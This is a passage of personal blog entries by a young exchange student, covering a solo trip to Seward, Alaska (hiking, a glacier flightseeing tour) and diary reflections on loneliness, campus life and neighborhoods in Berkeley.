running\nout, so after about only 1 km I turned back. Literally the snow was so\nhigh that I tripped and half of my body went into the snow. I didn't\neven go to the point where I could see views because there are too many\ntrees. The two woman looked prepared and kept going. During the way down\nI bumped my foot a little, and had to step into the icy water spring\nagain. I called the taxi and it picked me up. Then I searched the map\nand it was like 14 miles, which is like 22 kilmeters all the way, and I\nam not that well prepared anyways. I looked at photos online where there\nare trees and flowers and the trail seemed so beautiful in the summer\nwith no snow, and I was like, how bad is it that I came in such\nconditions. It is only mid-May, and I figured that it will take about 2\nmonths for all the snow to melt. Anyways, the day is long and hard, and\nI didn't actually see much, but it is still very unique first-time\nexperience for me.</p>\n<h3 class=\"photos2\" id=\"photos2\">Photos</h3>\n<p><br />\nRay's Waterfront<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/pzOCQzUS_lxgMFNXm2q1sHELHDUVu61EAMndwRcx57RLwkW1Hg5ckG0je-JSJ_tDnP2W3I1eQVOxOWLlWaROO0-drUIPWpXLUVjBmueDFmLqcsBhk9Lfhr1EgLiaLpXDa1T6x4sli3YR_nqa0Maezwg=s800\" /><br />\n<br />\nMt Marathon<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/A_jVFoYzd7auni0xsMC4AclRRbjwti2MzLkE1QZsgsrqZ-GVu5YRjdDUEx-124gzHhTqb0gLAGGXD7n16JlrCtzuXgj36V1qogAULys32adjHLpiyC2QrJsX_7RJ2u6k9ppaFIri-8idS3HFcgbz2do=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/KsiwDNr2OtCJ6glx_5rv-9mnNqk_W5dTJQLU3JQhWHcZNvbkOh1ptQB1joTfPAFX4slmWptBHsSFuF_70AhfhbzKu1P7h7hZcoevTKFaB58qrWXnUxO1GQS9KjWuGWteOLeCqRj2l6PloyRhlgqb0H8=s800\" /><br />\n<br />\nLost Lake Trail<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/QYWHgojcHLatHMkpkzDM9c4gwLqD18ihTkn2uyIvvuW1EM9w4ItK1G0JxmJ6wE2-JstGqSk_TNPyj1pL7-hbXYRO_3y9w4QOgL4ZC2ceA2WhgIFOAIHo3aZgMhW_K3wb28JWZx4TtWrdBSpmgDXmBJo=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/gTR_uvlptQ3DIZungebcQRt2CIpXfDxhJjtUK3fExtxWzjTPc_YcNmc-MkvvtQa4yHK-h-XDy2TSIwWvvVyHoRZ8g2cZ2uhOHYxiRY2uGntW6O1fsIV_3PpCBnTSA4FoJ0zQySixgTnV5mWMd00Svro=s800\" /><br />\n</p>\n<h2 id=\"518\">518</h2>\n<p>Today is 518, and it is halfway thorugh my trip. I am boarding the\nbus to Anchorage now, and hopefully I will be in Denali tomorrow\nnoon.</p>\n<p>Today I went flightseeing. It was originally scheduled at 10 am, and\nI woke up at 8 am to walk there. It is very hard getting up at 8, and it\nwas a long walk. I walked passed Seward High School and the Ryan Lewis\nMemorial Field, and there are some people playing soccer and frisbee.\nThey are very young, and I figured that they are probably the students,\nand I really wanted to join or have a conversation but I am quite\nsleepy, and need to go to AA Seward Air.</p>\n<p>When I finally went there, which is a kind of hard walk, and my legs\nwere sore. The winds were blowing so strong this morning I felt in\nblowing right in my face, and I went in the little house and chatted\nwith Malia, a worker in the AA Seward Airline. There are many brochures\nin the little house, and I thought about Kayaking adventure and\ndifferent hiking routes I didn't even try, and thought there are still\nso many things I can do. She asked where I came from and what I was\nstudying and had I been on a small flight before, and how there was this\nsnowstorm 3 weeks ago that made mountains still covered with snow, and\nthat in normal years snow would have melted. I learned that the pilot is\ncalled Joey Smith, but he is also kind of mechanics and organizer and\ncommenter. It kind of made me want to be a pilot someday. However, after\na while, she told me they couldn't fly the plane this morning, and I had\nto join the afternoon tour at 1 pm. I thought how I could have slept all\nmorning instead of waking up at 8 am,, but the tour at 1 pm is more\ncostly, so it turns out to be a budget, but still, it is very expensive\nto fly anyways. They offered me a ride, and I said I wanted to go to\nSealife Center, so they took me there in their car.</p>\n<p>However, sealife center is very small. There are only 2 floors and I\nsaw Seastars and Seals and Sea Lions and Shrimps and Anemone and Skate\nand Salmons, and some kind of birds with a strange voice. The birds were\ntrapped in a net so they can't fly out. I ended up getting out in less\nthan 1 hour,, and there was still some time left before 1 pm. The wind\nwas very strong outside.</p>\n<p>Then I went to the Waterfront Park, the view is fantastic, the snowy\nmountains rising on the otherside. There are some kids halfway on a tree\nand they smiled and said hi to me. Then there is a pavilion where\nsomeone is having a barbecue and it smells so good. But it is kind of\nprivate. Then I saw a playground where there are kids of all ages, some\nalmost my age I think. They are playing happily on the swing. Then I\nkept going, and it became so windy that I had to get my hat on, and\ncould barely walk. I went to Firebranch BBQ to have lunch, which is kind\nof delicious.</p>\n<p>Then I walked to AA Seward again, which is like 2 miles walk, so I\nended up walking 4 miles in total, which made me sore. I walked on the\nrail track, and got there in time, at 12:30. Then I saw Malia again, and\nit turns out that I would be flying with an Australian couple. The\nelderly couple was really nice, and introduced themselves and the big\nman shook my hands and said Hi Jim, and told me he was Rob.</p>\n<p>Then we flew on the plane. It was my first time on a flight, and I\nwas so excited. I had those life jackets on and they also suggested me\nweating earcovers with microphone as a way to communicate, since it was\nvery loud, by normal voice people cannot hear each other. There are 3\nseats beside the pilot's seat on the airplane, and it is sort of formed\nlike a car.</p>\n<p>Then the plane took off, and in a matter of seconds the town of\nSeward went small, and the pilot Joey Smith said we are going to see\nglacier, and off we went. Everything just seemed so spectacular on the\nairplane. I had seen some glacier on the boat, but on the plane it\nlooked totally different, and we went straight over, and I could see all\nthose oddly shaped icebergs on the ground. Occasionally there is a blue\npond, and it reflected in the sunlight. The glacier is just dazzling,\nand I was taking pictures the whole time. The man chatted with the pilot\nabout how to tell winds, and it seems the man had some experience with\nflying a plane.</p>\n<p>On the way there was a bear on a beach, but it was on the other side\nof the window. I also managed to take a picture of the bear, and it is\nthe first bear I saw on the trip. I figured I would probably be seeing\nsome in Denali. I kind of wondered why sometimes the lake shows a\nreflection of the mountain and sometimes it doesn't. I then thought that\nthis is as good as those scenery films on YouTube featuring like\nSwitzerland or Iceland, with floating icebergs from the glacier, and all\nthose beautiful shapes carved by snow. Most of fresh water comes from\nglaciers.</p>\n<p>Then we went to Harding Icefield, and the pilot said there are some\nglacier climbers he had just dropped off here a few days ago, and they\nare camping down. We managed to get a pretty close look on them, and\nseems to me glcier climbing seem so interesting. We were going past the\nHarding Icefield, and it looked like a white desert, so pure and so\nwhite that I could barely open my eyes. I was amazed by this massive\nwhite down there. It purified my heart, and I looked at the harding\nicefield and it gave me a sense of calmness when I thought about\neverything else. In the ground snow covered everything else and white is\nthe only color, and I thought that maybe after a few hundred years after\nmy death my life would be kind of like that, with white covering\neverything and leaving not a trace in the world. I am yet to go to a\ndesert, though. The pilot said that if we land down there the snow can\nget all the way to waist. I kind of wanted to go to Harding Icefield\nTrail but it was closed. Then we circled back.</p>\n<p>Then the flightseeing tour ended and it was really fantastic. Then I\nthought that a bird could easily do that flight everyday. However, a\nbird can't talk or be as smart as humans so anyways, and we were saying\ngoodbye when the couple noticed I was walking, so they offered me a\nride. I was touched and so grateful fromt he kindness of strangers, as I\nbarely talked with anyone all year long, and barely know anyone would\nhave such kindness in their hearts. So I got in their car, which is big\nand contain a table and 2 beds. They are very kind and let me sit in the\nfront. I kind of want to rent a car too. I thought about coming here\nagain in summer of 2025 when I would be 20 years old, and I would learn\nto drive and rent a car like theirs and drive up to Prudhoe Bay alone,\nand how I would see the Arctic Ocean and the northern lights, and hike\nto the most beautiful places in the world.</p>\n<p>The man told me they had 60 kangeroos in their backyard, and when\nthinking of backyards I was like thinking about the 30 square feet yard\nthat people in the first floor would have, and it felt too amazing to\nbelive. Then they told me their backyard was 9 acres, and I found that\nit was something as large as 10 football fields, and I couldn't help but\nget amazed even more. Then they said it wasn't even big in Australia,\nwhich made me wonder just how different are people's life around the\nworld, and I have no knowledge at all about the world whatsoever if I\nstay in Shanghai my whole life. They dropped me off at Harbor 360, and\nthe woman gave me a doll with Australia on it, and I was so grateful for\nthe gift. I thought about going to Australia one day, and it turns out\nthat I forgot all of my times in New Zealand.</p>\n<p>Then I saw a free shuttle and I hopped on it, and the driver was like\nwhere are you going, and I was like I don't know just wanna go around\ntown. There are about 20 other people on that bus, so I went around and\ngot off at Sealife Center again, because I didn't know where else to go\nto. Then it was like 14:23, and I figured that since the bus departs at\nlike 6 pm I stil had lots of time to do whatever I wanted, and I thought\nabout going around and turning back at 4 pm. I first went to the Lowell\nPoint Waterfall, which is quite small. I was at kind of south end of\nSeward and didn't know where to go, since Caines Head was like 2 miles\naway and there are no trails besides Mt Marathon that is less than 2\nmiles away, so I settled with Mt Marathon, and I decided I am climbing\nit again. Since I was climbing the hiking trail yesterday, I figured I\nwould be climbing the racing trail, and I went to the trailhead\nyesterday and a man explained to me where the racing trail was--at\nJefferson Road. So I walked to Jefferson Road and went in and tried to\nclimb it.</p>\n<p>However, the path is so treacherous. I never saw such a primitive and\ndangerous path ever before. I first saw the cliffs, but there are\nsliding rocks just everywhere, it is just too dangerous and not even a\nway to go. Then I saw another trail and went up a little and found the\nwaterfall switchback trail, and I figured that it is the \"easier\" trail\nand I would like to attempt it somehow. The path went up a waterfall,\nand it was so steep like 40 degress up. There are leaves and mud and\nfalling rocks everywhere on the way, and it was just impossible for me\nto climb with a backpack and my jacket in my hands, so I put the jacket\nin my bags. I climbed like 30 meters and couldn't go on anymore, and it\nfelt truly like rock climbing. There are many rocks that is not stable,\nand there is no place I could get a firm hold on or put my feet on. At\none point I was almost sliding down the mountain, and kept myself not\nsliding with my arms almost underneath me. And there is nothing I could\ndo except turning back from the racing trail before going through the\nfirst like 50 meters.</p>\n<p>And then I began to climb down, and I realized how hard the trail was\nagain. Turned out that I crawled on all fours with my butt on the ground\nand my backpack in my hand, and I got my pants all covered in dirt. But\ngoing down is much safer. Then I saw 2 people, probably a couple, coming\ndown and they were going so fast on the impossible trail for me and they\nlooked as quick as a rabbit, and as easy as walking on the ground.</p>\n<p>I thought that since I had grew up in Shanghai, a crowded city where\nthere are no wildlifes and no mountains and doens't seem to be exposed\nto any kind of nature except those artificial small trees and tinny\nponds in the school or something like that, I have no experiences with\nthe mountains or rocks. I imagined myself going up the treacherous trail\neveryday instead of playing in Century Park, and camping outside and\nhiking alone instead of spending most of my time in cram classes, and I\nthought that would be so fun, and this path shouldn't even be hard for\nme. However, I could not go back to my childhood, nor could my parents\nafford it anyways, and I thought that maybe if I come here after\nobtaining maybe a higher degree and be a professor or something, then I\nwould have the chances of exploring nature pretty much all the rest of\nmy life.</p>\n<p>Anyways, I said hi and since I was lying on all fours they jumped to\nthe other side of the waterfall and went down really quickly, and before\nI took one or two steps they were at the ground. I finally went down the\ntreacherous path, and they were just driving away in their cars, and we\nsaid hi again. I said I am visiting and they said good job, and the 3\nmile up the mountain are the hardest in the world, the waterfall part\nare very hard and it will be easier up there and they congratulated me.\nSo I was happy again. I kind of wanted to go up there but anyways I was\nlucky to go without injuring myself. I went to the railroad depot and\nboarded the bus.</p>\n<p>Then it became time to say goodbye, and it became very very sad--I\nnever want to leave Seward, and this is almost my favourite place so\nfar. Alaska is so much better than Berkeley, where you cannot even eat\npeacefully at a Macdonald or Subway, where there are too many homeless\nand beggars and strange people that walking on the streets downtown\nyields a feeling of disgust, although the surrounding area is ok. But I\nfigured I have been to most of the surrounding areas already\nanyways.</p>\n<h3 class=\"photos234234\" id=\"photos342342\">Photos</h3>\n<p><br />\nSeward High School<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/h7tSAsREqNYRGb8AviTLGpTbUvSZrL6k48TiRH4Nrhtpe55zV4dFyrXwcQ9AZo4SQhKmX4-7ySU_wpE22JqKseytFrDrWP9Eb2Wj9izqGP4HhLYmi1Umli82QdywgwFTrQQd28YmraVbzoJRm3iW2TJSiQ3sIDU8w5_xPRxB6Eu-wfoUgZSPmCRoaML4og=s800\" /><br />\n<br />\nResurrection Bay<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/QQBF-eEDOQjSbGH1zJSpBn3k05qrquZwnBxj-mgxLbIn9SZ7wrbTUcjpgMnrHAh20btqwJwgCUx7hjs444KkjxzT19ozRtOW5_cC5Idd5nmpE2ZU3PAUlB_4-DTzWUrLpBtuS7GCPPOf1e_2BdYbEQQRkQSOGZz3-awIl1RLahekVijkmG2VPHv0PuLyfQ=s800\" /><br />\n<br />\nHelicopter Tour<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/Chp_rt-o13Poz5NYWiaj0caYi2x2NMfexdt_EkKrn_gs6BJtolXlJtkll20SL1aGV4PrVTeDHCkc72y29HTlQChmdeADR8pN5pluQlioyGzRK3qDATLt5cJj9hGViAno3p3RDDuPm2oh6qw96GmHkMduVUNizfbjTbQBgOWpSTnz2ZiArp-DMHMm02u0hg=s800\" /><br />\n<br />\nBear Glacier<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/1Lmv8TcGxgHVrzJOWEYANojKuleZGSHZ1wN6UXrbnr_lCpIpPkQq0xTg68qhMgbJSvqVoJgpL7ZOz0lIhB_s0kYqtK6hCsA2xf6hetRXgxfXw08NfEyw6B73gCahYHzFjxv_mU1l0AHcaYFQbUd6Zf6jHEcDh09peVkDTqirsv75_zXpVcBxDatOTBbRlw=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/V8ibHfD5QLfX_UMiebIws8fHU6Te_rQCbpl40bog2bgk86i7Kndyay3UWR2FqKSUh4hNnEI_dEqNytlmDQx2G3H65scDK-IVctnnE3DRbCjvfd99i4J-FtYe06W33UZCsCYIKwpbDgIGaMsAUP82dEYHfyiHeT2gD-F-IiPg6aZBWI04hoZIcVMKCSseRA=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/n-UK0GDgiIxDRHnlBeXbvbsb9NwJ8ZCt6-UHUoOzrIran2NPk_NF4nBAuEFqE6Je02aGKkhAcvA5wcagIUQrtG926vF-pNefnmK3KjznHpwL6KX1tbGBzs-FRBG6Muz6LZDZppga_z4W-GTfOUDj9eQB0tPokKkZm8ORkBlalvxl2n7sXoFZUWjjJv0sxw=s800\" /><br />\n<br />\nSlate Island<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/FtbuenJDo4FlOt1saxOMFsDXNgV9cPBdBsaJARBFHKwe7_9Bb_vbioXllGw6p6xzQH9_GKXB-8fKcqU5vUWnPiRVmbUuIDEbQReqq5QHw4l50-pG_uxLbGa4r1WKoOMt50kuZwLJzgUfgcRCVd4oQQC6D4RiZSgeGKSJVEv_Kfs5254dqVKhtC-MwIGXWg=s800\" /><br />\n<br />\nResurrection Bay<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/07kY4lDZKqykaPGmDFsBZI9WNtPwEVrMYs-0gUVz5PiZjXDU1xuLuJvniWs7fH1rMbWZj1C9Vvxs0mAPmJnFIAj1lS_15nhNF1A1IQk5tvt0ZILmUt5OvobfiPdSpIs9WMv65cy08IMrFZOebZL_eU69ybebodRQXyOCLalVfot2BSj-fKcGhAggmOCbLw=s800\" /><br />\n<br />\nHolgate Glacier<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/JTmd0bPkCK2gxei4P-ynhT8SCEnyPkO4evRrCmdVn01aicEILiyuAGlHiw8M2gBm8ND3NuC2pHyDeNRu0JgZ8uA465sdLpl-6O8_JrAFkh7I87cuxZi1h8v5OfWwrI3l01Eue0hx1fpOogZ1OK-OYKe1yAkS5uOHnsKXQR98jELg26C1_5rp4oGv6U-RkA=s800\" /><br />\n<br />\nHarding Icefield<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/JZechodUbr0a6057X0NecSgFfdzPurc4_QP4Sym7TikDUN3M-7VHYkVy80CZJS2JHAh_jG730Hu-Huap7wbir0UR8Vt4HiH04ICLCEmDcYuYm-T-Wx2oYKRQbJZiQwX0jywfmNifTsXpQyUWVnd5mnLHVGoMAFRCpJFJCSedEPPfp3B-q9qPjwdF-UDP9w=s800\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/yohVcog3SbhqSR9r6j8P0m9Ntjsn1Ql07JeBSfxgO4MCNzTPhx2MrSAC2wQIWb7YFrPxtiQYfTkE_IF_4b1bnVpVcNalOUqzdkPTj3nP6meEVW9ztXuzkfejxrzkGVZsEgJSEZhJgRWsrV3jCiuObV0e5Pp7htG3c5b-nOAG7QP2xh3riFa3MnpjbMOZqw=s800\" /><br />\n<br />\nThe car I Hitchhiked in<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/36rU-Q-itKe3so5CkEtnMl3yJ4dLh2NKT1eLxP7awlz1LL6eknt2mfz1RTBhG_xRfZcs3N8cF2dlwGOQLfGxc7DyobZGA8ZqDJe0SGDrpk3Uc4C8q0peFq80ygvyT8zp5_PENTejmePSjWJcFNKWH9ahMszPJi6URXsqS9vmdTAp-j_VbCymigeMotkZSQ=s800\" /><br />\n<br />\nWaterfall Switchback Trail<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/fhvAPQFl3Gv0wemWJcoMisVYd6RuaKhihNz6nVLuQl6VTPjGE72fmh0QhcTQ_EfNLM1oaEZy2zmLiG85H-neOWiuksJWK49bWqyPX3PHuXXk6lzrIA2QqS7ki74zCsaIsNBHCH6aNuqB3_xsi2Kq9gigovkmrMBQ6Jvuhgh8ShGZ0zPPlvt1sSj-YzeiJQ=s800\" /><br />\n<br />\nSummit Lake<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/qgvIiDNdy3J_sQPzCcLYkNzAHCpdmCM0f8YZgSnE3EvTMgxVZGwSiEMbkKM_s_e2Wqe3J8DXH9vOH3BvFkovolaU7CzdB4RL53lKTbTlntqehbh8EtyCkNg52d2H--tYL81hNNYgVoULv-Fc1PMttgIutEWzaP_Ba-B24PVCWGXJQanX1MKjRLSGYhZleA=s800\" /><br />\n<br />\n</p>\n", "_id": "66689633547d3fe098118748"}

Everybody takes a day off.</p>\n<p>Today is a fine day, the sun shining bright and clear sky. But it is\nvery windy. I did almost nothing, just playing and wasting time all day,\nlike every other day.</p>\n<p>Tomorrow my classes are starting. I am so afraid that I cannot\nunderstand the class materials.</p>\n<p>My housemates are just moving in. There weren't very talkative,\nspending most of their time in their rooms.</p>\n<p>My fourth finger hurts a little on the edges, but it's like no big\ndeal.</p>\n<p>I mean, now I still haven't got many friends. My social life is so\nstrange starting from middle school. I really want to have some people\nto talk to and hang out with. I mean, it sucks to be alone.</p>\n<p>I know that learning is the only thing that I should actually do. I\nknow that I still suck. But seeing people my age hanging out with\nfriends just makes me kinda feel so lonely, you know. Sometimes when you\ngo to a concert or a show alone, and you don't enjoy and walk out. But\nif you go to see a drama with someone else, it gets so interesting.</p>\n<p>Most of the time, I am telling myself that learning is the only\nimportant thing that matters in my life. If not, then why should I go to\nShibei instead of SMIC? Why should I go to UCB to exchange instead of,\nlike, UCI? My parents cared about this thing a lot. I have thought about\nnothing more, and here's my conclusion. I am still so bad, and I should\nkeep learning my priority and ignore other stuff.</p>\n<p>My sleeping schedule is still strange, I mean, the bed doesn't make\nyou very sleepy, so I ended up spending much time trying to fall asleep\nand wondering nothing.</p>\n<p>Tomorrow my schedule will be more packed, and I think this semester\nwill be the most unique one in my life.</p>\n<p>There are many things I hope to achieve, but I doubt that I will make\nany one of them. It was just that, you know, how uncontrollable I\nam.</p>\n<p>Berkeley is a beautiful place, and foothill is a yummy cafeteria. I\ndon't care what other people are saying, but the dining hall food is\nenjoyable. I guess that I just enjoy almost any food, except those very\nspicy, salty stuff.</p>\n<p>Windows became very slow. I hate it when it becomes like that. I\nmean, Linux computers are much faster and easier to use without having u\nwait a thousand years to load some basic features.</p>\n<p>Today I went to Edward's Stadium and saw a group of students.\nActually, it wasn't kids. They look quite old. I mean, not old, but\nmature. They look much more mature than me, and I believe that they may\nbe a few years older than me.</p>\n<p>I believe that by focusing on academics, I can enjoy life and be less\nanxious, achieving a sense of serenity. But I am so stupid and lazy. I\nreally hope I change someday.</p>\n<p>Oh, and by the way, I am just trying to get up early. I mean, I have\nto go to morning classes at 8 am, so I have to get up before 7,\nright?</p>\n<p>It was like climbing mountains, just going to the classrooms and\nlibrary.</p>\n<p>I also want to run, but somehow I had classes every day at 5 pm, so I\ncan't join the Cal Running Club. I want to run myself on Edward's\nStadium, but it was, like, usually closed. Many people here wear shorts\nin this freezing 50 F winter, and some of them aren't even fat. I feel\nso cold sometimes.</p>\n<p>I dunno what else to say in this log.</p>\n", "_id": "66689634547d3fe098118749"}
{"title": "Visiting Berkeley High School", "date": "Fri Jan 12 2023 22:23:12", "type": "berkeley", "body": "<p>Today I went to BHS for a visit; I mean, I basically sneaked into the\ncampus for a whole morning. Now I am going to talk about the impressions\nI had of that school.</p>\n<h2 id=\"last-night\">Last Night</h2>\n<p>I didn't know if I could enter the campus last night, so I walked\naround. I found the campus door open, and I walked inside, kinda scared\nbut not really, because I am 17 and the age of a high school junior or\nsenior, and also, nobody like an adult staff is insight.</p>\n<h2 id=\"soccer-match\">Soccer match</h2>\n<p>So basically, I ran into this soccer match going on there, I even\ntook a few pictures. There are some people watching on the stage. It\nlooks like a nice playground.</p>\n<h2 id=\"the-gym\">The Gym</h2>\n<p>That's all for yesterday, and today I went to the campus at 7 am. I\nfollowed a couple of guys into the Academics building and started going\naround. At first, I was kinda afraid that some staff would show up, but\nthen it seemed like I blended in, and nobody even talked to me. Then I\nwent into the library for a few hours and listened to a literature\nclass, which was very easy and fun.</p>\n<p>What is interesting is when I was moving around campus staff don't\npoint and talk at you, and I don't see that many staff. Long as you\ndon't bother them they won't do much to you, so as an outsider nobody\nquestioned me.</p>\n<h2 id=\"campus-in-the-morning\">Campus in the Morning</h2>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/f7e33c63-a3ec-465c-a13a-0915062eb576\" /></p>\n<h2 id=\"nice-campus-building\">Nice Campus Building</h2>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/a0ddb305-d2bd-4e33-b8c5-77dd95bc9d45\"\nstyle=\"width:80.0%\" alt=\"Nice Campus Building\" />\n<figcaption aria-hidden=\"true\">Nice Campus Building</figcaption>\n</figure>\n<h2 id=\"mathletes\">Mathletes</h2>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/0f067fad-afe1-4374-a4cb-18dc1b1571dd\" /></p>\n<h2 id=\"health\">Health</h2>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/57fb8270-3599-4e70-b374-8b555869382a\" /></p>\n<h2 id=\"hallway\">Hallway</h2>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/b8a4bfee-d2e3-4064-b74e-ff2d7398c667\" /></p>\n<p>I feel like I was in a movie without roles. I was not getting\ninvolved anyhow with their daily life, and I have no friends here. I\nreally want to interact or just communicate with some of these students\nabout their daily life and what they like, just anything. This kind of\nlife feels foreign to me, and as a 17 yo, I really want to join in the\nconversation and have a various life in high school. Walking down the\nnoisy hallway, I felt like I could blend in easily with the school\ncommunity. Problem is I had almost no conversation today at that\nschool.</p>\n<p>When you don't know about anything and have no idea of what people\nare like, and have no idea of what life is gonna be, you really kind of\nlose a sense of direction and have no motives. Why do I want to do this?\nSometimes I wish I do not study at a university but in high school\n'cause that was supposed to be the right place for me, and they were\nsupposed to be unforgettable years. But from another's perspective, I\nwas more than lucky, and they envied me so much, being able to escape\nfrom the sad reality.</p>\n<p>I always feel a sense of loneliness at university. I feel like not\nbeing actively involved in anything. After so many days, I finally came\nto the conclusion that I could not live without the presence of other\npeople, that I am a member of society, and that I have to live with a\ncommunity and friends, not alone like Robinson Crusoe. Sometimes things\ndon't work that way.</p>\n<p>There are students of all races and looking very different. There are\nblack, white, and yellow, but they are kind of tall. What's more, some\npeople wear shorts when the weather is, like, 50 degrees. Other girls\nare dressed really hot. Some people wear heavy masks in school, but most\npeople don't at all.</p>\n<p>Students are walking in groups actively talking about the things that\nthey are doing and fun stuff; nobody is glued to their phones. I mean, I\ndon't see almost anybody looking on social media like in China.</p>\n<p>The classes in high school are mostly small and split into\ndiscussions, which is kind of interesting because you get to know other\npeople. The teachers don't do long and boring lectures that much.</p>\n<p>I do not want to be required to do lots of things. Teachers and\nparents are like, you should study, and that is your responsibility,\nwithout telling you why you should. Anyway, there are lots of people out\nthere well off who do not study but have talent. What I want to do right\nnow is to discover the world and understand things; in China, they say\nlike, doing this is harmful to you concentrating on studying and\nstopping doing it, so people went back to playing video games on their\nbeds. I do not see why what I am doing can't be a choice of my own; I\nmean, obviously, I am part of the society, but freedom to choose and to\nlive is vital, and that freedom is worth anything.</p>\n", "_id": "66689634547d3fe09811874a"}
{"title": "Berkeley in My Eyes", "date": "Thu Jun 01 2023 15:38:31", "type": "berkeley", "body": "<h2 id=\"downtown\">Downtown</h2>\n<p>Downtown Berkeley is really ugly and there are many homeless people.\nThey yell, beg for money, shout profanity, and sometimes run around\nnude. I could smell the scent when walking past them, like they hadn't\nshowered for months. Around Shattuck Avenue there are many homeless\npeople, and sometimes they form groups. There are also many construction\nsites that lasts for years, and block the road, so it is really hard to\ngo through. The roads are dense, so I have to wait for traffic light\nafter walking like 50 feet.</p>\n<p>Downtown Berkeley at night is not the most pleasant place to walk\naround, as the roads are pretty much empty except for those homeless\npeople walking around.</p>\n<h2 id=\"nighttime\">Nighttime</h2>\n<p>At about 9-10 pm most stores are closed. From 10-12 am, many homeless\npeople are walking around in Shattuck Street, and there are still some\ncars around. I think those homeless people are looking for places to\nsleep. There are still some small groups of students here and there.\nAfter 12, like in 1 am or 2 am in the mornings, all stores are gradually\nclosed. except for some fast food restaurants that sell hamburgers in\nsouth of campus at Durant Street. Then after 2 am, there are almost\nnobody on the streets, and most homeless people find a place to settle.\nIn 2-4 am in the morning, if you walk by some parks or grasses or\nbenches you may spot some people lying and sleeping there, which is kind\nof scary to be honest. There are little cars driving by. The small roads\nare almost pitch dark. The big roads are dimly lighted. Some stores and\nbakeries still have light on but there was definitely no one inside. If\nyou want food at this time of the day, the only stores open is a seven\neleven on College Avenue south of Berkeley, which is like 1.5 miles from\nthe school. When I walked there in 3 or 4 am it is locked to stop\nhomeless people from entering, and you have to knock, and a person will\ncome to the door. The roads was so quiet and calm. After 4 am sometimes\nI could see one or two people walking their pets, and then the birds\nwould start chirping marking the start of another day. When you walk by\nTrader Joe's there was light and you could see some workers shuffling\nthe shelves, although it won't open for another 2 or 3 hours. Then after\n5 am it gradually become light, and the eastside hills was covered with\nmorning fog. In the school there was some construction going on and\nthere was trucks driving by really fast. From 6-8 am the street was\nstill very quiet, and most stores still closed, with some people jogging\nin the early morning sun and the fog disappearing.</p>\n<h2 id=\"north-berkeley\">North Berkeley</h2>\n<p>Compared with Downtown, the north side is much better. There are no\nhomeless people, and the houses are better constructed.</p>\n<p>But it is very hilly, and tiresome to walk around carrying a laptop.\nWhen I carry backpack to school, it gets so hot and I would be sweaty.\nThe east side is much higher than the west side in elevation.</p>\n<h2 id=\"west-berkeley\">West Berkeley</h2>\n<p>The west side are mainly many small roads leading to the Bay, and it\nis better than downtown and not hilly. I would usually go running there\nat evenings. It is smooth and quick to run down University Avenue, since\nit is a slight downhill, and I would usually go at a really fast pace,\nlike under 4 min kilometer. But some roads are small and I bumped my\nfeet once on Dwight Road. The trail starting from Strawberry Creek Park\nnorth is good enough, and Cedar Rose Park is a good place to see stars\nat night. It is also convenient to take bus 51B to go there. Going\nwestward, and there are two big roads, Sacramento and San Pablo Avenue.\nAfter that there is 10th Street, and the numbers start decreasing till\n4th Street.</p>\n<p>There are many beautiful clothing shops on 4th Street, and some fancy\nrestaurants. I went in there, and the waitress were nice, but the\nclothes are too expensive and not suitable for me.</p>\n<p>Then there is Aquatic Park after crossing the bridge over the\nrailroad on University Avenue, and an outlook. There is a hiking trail\nalong the coastline and I hiked both ways. Northward along the coast\nline is Albany, and southward is Emeryville. Emeryville is cleaner and\nbetter than Berkeley, and not hilly.</p>\n<h2 id=\"south-berkeley\">South Berkeley</h2>\n<p>There isn't much to see on the south side. There is just some houses,\nbookstores, grocery stores.</p>\n<p>I remember going down to Downtown Ashby Bart Station, which is quite\nclose. But it takes more effort to go down to Oakland or Emeryville, and\nthere isn't much to see or do anyways, except maybe a park on the way.\nIt is hard to find grocery stores and restrooms on the way.</p>\n<h2 id=\"east-berkeley\">East Berkeley</h2>\n<p>East side are mountains, and there are a few trails going up,\nincluding Big C Hike.</p>\n<h2 id=\"uc-berkeley\">UC Berkeley</h2>\n<p>There are about 30 thousand students in one grade in UC Berkeley,\nwhich is like 15 times USTC. Students are from all around the world.</p>\n<p>The classes are usually crowded at the beginning of the semester, but\nalmost empty at the end of the semester, like only one fifth of the\nstudents are there. This is very strange, since in USTC the class size\nare almost no different. Probably most students prefer remote\nlearning.</p>\n<p>It is tiresome to get around the campus, as there are no west or east\nside of the campus, and walking around in classes takes some effort.</p>\n<p>There are no convenient stores or cafeteria or student dorms in\ncampus, and there are only expensive cafes and cafeteria off campus. I\nremember everyone heading to eat back in USTC after classes, but here\npeople go in all different directions. There are only 4 cafeterias, and\nthey are not usually full, so I figured that people find there own ways\nof eating.</p>\n<p>Usually in the morning the campus is mostly empty, but in the\nafternoon it gets really crowded, and just people everywhere. Also, at\nweekends most libraries are closed, and there are no recitation or\ndiscussion, which is quite different from USTC, where weekends look the\nsame with 